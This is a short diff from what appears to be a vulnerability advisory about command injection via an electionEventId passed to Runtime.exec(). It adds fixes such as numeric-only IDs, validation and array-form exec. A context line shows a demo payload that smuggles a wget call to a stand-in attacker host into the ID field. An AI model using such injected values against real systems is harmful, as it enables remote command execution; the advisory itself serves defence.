@@ -103,6 +103,10 @@ Given we would have access to it a demo exploit would look something like this:
 - Register a voting event with a electionEventId named "$({wget,http://www.attacker.org/})"
 
 
+To fix the vulnerability one could allow only numeric values as an electionEventId.
+Another way would be to validate the electionEventId before passing it to the Runtime.exec() function.
+Also one could use a string array for the getRuntime().exec() function to ensure only parameters get passed. 
+
 
 | Researchers |
 | --- |
